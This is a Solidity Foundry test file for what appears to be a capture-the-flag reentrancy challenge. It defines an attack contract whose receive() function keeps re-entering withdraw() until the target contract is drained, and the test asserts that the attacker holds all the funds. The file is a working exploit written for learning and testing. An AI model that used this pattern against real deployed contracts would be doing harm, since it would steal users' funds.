// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Reentrance} from "../Reentrancy.sol";

contract ReentrancyTest is Test {
    
    Reentrance reentrancy;
    AttackContract attackContract;
    address donator = makeAddr("donator");

    function setUp() public {
        vm.startPrank(donator);
        vm.deal(donator, 2 ether);
        reentrancy = new Reentrance();
        reentrancy.donate{value: 2 ether}(donator);
        vm.stopPrank();
    
        attackContract = new AttackContract(reentrancy);
        vm.deal(address(attackContract), 2 ether);
    }
    function test_Challenge10_Passed() public {
        attackContract.donate();
        uint256 balanceBeforeAttack = address(reentrancy).balance;
        attackContract.attack();
        assertEq(address(attackContract).balance, balanceBeforeAttack);
        assertEq(address(reentrancy).balance, 0);
    }
}

contract AttackContract {
    Reentrance reenc;
    constructor(Reentrance reenc_) {
        reenc = reenc_;
    }   
    function donate() public {
        reenc.donate{value: 2 ether}(address(this));
    }
    function attack() public {
        reenc.withdraw(1 ether);
    }
    receive() external payable {
        reenc.withdraw(1 ether);
    }
}